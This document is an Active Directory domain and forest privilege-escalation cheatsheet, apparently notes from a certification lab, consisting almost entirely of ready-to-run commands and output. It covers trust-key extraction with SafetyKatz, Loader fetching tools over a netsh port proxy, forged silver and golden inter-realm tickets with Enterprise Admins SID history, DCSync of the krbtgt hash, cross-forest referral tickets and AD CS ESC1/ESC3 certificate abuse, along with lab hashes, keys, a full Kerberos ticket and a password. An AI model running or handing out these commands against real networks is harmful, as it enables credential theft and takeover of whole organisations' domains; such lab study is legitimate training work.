# 🏁 Cheatsheet - Fast Commands (DOMAIN/FOREST PRIVILEGE ESCALATION)

## Trust Key Attack (evasive-silver + asktgs)

### Enumerate Trust

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
powershell
. C:\AD\Tools\PowerView.ps1

Get-DomainTrust
Get-DomainTrust -Domain moneycorp.local
```

### Extract the trust key

We need the trust key for the trust between dollarcorp and moneycrop, which can be retrieved using Mimikatz or SafetyKatz. Start a process with DA privileges.&#x20;

Run the below command from an elevated command prompt:

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

[snip]
```

Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials:

#### Share Loader to dc machine

```
C:\Windows\system32> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
Does \\dcorp-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

#### Connect to the DC & Portforward

```
C:\Windows\system32> winrs -r:dcorp-dc cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\svcadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X
```

#### Use Sagetykatz to extract

```
C:\Users\svcadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
[snip]

mimikatz # lsadump::evasive-trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 2/24/2023 1:11:33 AM - CLEAR   - 79 d9 90 1f 7c db 09 b7 65 a0 e5 e4 50 03 35 8b 99 fb eb bb e7 ba 54 89 b7 b2 f4 fc
        * aes256_hmac       34f94d19178a75cb04b9c10e657623c5ac9074fbc7fcf4e20be8527b77407243
        * aes128_hmac       40856eb80d3323adf23a3b7faad3c180
        * rc4_hmac_nt       132f54e05f7c3db02e97c00ff3879067

[snip]
```

> El SID que termina en **-519** es el **Enterprise Admins** del dominio raíz (moneycorp.local). En este lab concreto, el SID completo es siempre el mismo:
>
> **S-1-5-21-335606122-960912869-3279953914-519**
>
> Este es el grupo **Enterprise Admins** del dominio moneycorp.local (el dominio raíz del bosque).

> mcorp / S-1-5-21-335606122-960912869-3279953914-519
>
> mcorp:4445f1fb52d0ad4784175d51a769a64554fc80ff95144569fbe298c7441b5745

### Forge ticket <a href="#forge-ticket" id="forge-ticket"></a>

Let’s Forge a ticket with SID History of Enterprise Admins.&#x20;

<mark style="background-color:yellow;">Run the below command in use VM Machine:</mark>

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3db02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap

[snip]

*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519

[snip]

[*] base64(ticket.kirbi):

      doIGPjCCBjqgAwIBBaED...

[snip]
```

> kirbi; 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

Copy the base64 encoded ticket from above and use it in the following command:

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:TICKETBASE64HERE
[snip]
  ServiceName              :  http/mcorp-dc.MONEYCORP.LOCAL
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL

[snip]
```

Once the ticket is injected, we can access mcorp-dc!

```
C:\AD\Tools> winrs -r:mcorp-dc.moneycorp.local cmd
Microsoft Windows [Version 10.0.20348.2227]
(c) Microsoft Corporation. All rights reserved.

C:\Users\TEMP> set username
set username
USERNAME=Administrator

C:\Users\TEMP> set computername
set computername
COMPUTERNAME=MCORP-DC
```

***

## Golden Ticket Inter-Realm (evasive-golden local)

We already have the krbtgt hash from dcorp-dc. Let’s create the inter-realm TGT and inject. Run the below command:

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt

[snip]

[+] Ticket successfully imported!
```

We can now access mcorp-dc!

```
C:\AD\Tools> winrs -r:mcorp-dc.moneycorp.local cmd
Microsoft Windows [Version 10.0.20348.2227]
(c) Microsoft Corporation. All rights reserved.

C:\Users\TEMP> set username
set username
USERNAME=Administrator

C:\Users\TEMP> set computername
set computername
COMPUTERNAME=MCORP-DC
```

Awesome!

We can also execute the DCSync attacks against moneycorp. Use the following command in the above prompt where we injected the ticket:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

[snip]

Credentials:
  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
    lm  - 0: 87836055143ad5a507de2aaeb9000361
```

> krbtgt:a0981492d5dfab1ae0b97b51ea895ddf

***

## Eurocorp Access — External Forest (LO20)

> Different from LO18/19. SID History is filtered on external trusts. We forge a referral ticket using the trust key between dollarcorp and eurocorp, without SID History.

### Extract trust key (dcorp ↔ eurocorp)

> From DA cmd on dcorp-dc (same portproxy setup as LO18)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

> From the output look for `[ In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL`:
>
> * **aes256**: `a18ce7d3072431334db257ab167347b20a1f59c257f808f7e6fc0cb89ace8bac`
> * **rc4**: `6c7869737f13b0dd2a47911f6e8cab60`

### Forge referral ticket (no SID History)

> Back on student VM:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /aes256:a18ce7d3072431334db257ab167347b20a1f59c257f808f7e6fc0cb89ace8bac /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```

Copy the base64 ticket from output, then:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:TICKETBASE64HERE
```

### Verify access

```
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

***

## AD CS Attacks — ESC1 and ESC3 (LO21)

### Enumerate CA and templates

```
C:\AD\Tools\Certify.exe cas
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
C:\AD\Tools\Certify.exe find /vulnerable
```

### ESC1 — DA via HTTPSCertificates template

> Template `HTTPSCertificates` allows requestor to supply Subject Name and RDPUsers can enroll.

Request cert as Administrator (DA):

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:HTTPSCertificates /altname:administrator /sid:S-1-5-21-719815819-3726368948-3917688648-500
```

Save output (from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----`) to `C:\AD\Tools\esc1.pem`, then convert:

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
## Export password: SecretPass@123
```

Use PFX to get TGT as DA:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt
winrs -r:dcorp-dc cmd /c set username
```

### ESC1 — EA via HTTPSCertificates template

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator /sid:S-1-5-21-335606122-960912869-3279953914-500
```

Save to `esc1-EA.pem`, convert, then request TGT:

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
winrs -r:mcorp-dc cmd /c set username
```

### ESC3 — DA via SmartCardEnrollment templates

> Two-step: first get Enrollment Agent cert, then use it to request DA cert on behalf of Administrator.

Step 1 — Enrollment Agent cert:

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
## Save to esc3.pem
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

Step 2 — Request DA cert on behalf of Administrator:

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
## Save to esc3-DA.pem
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:SecretPass@123 /ptt
winrs -r:dcorp-dc cmd /c set username
```
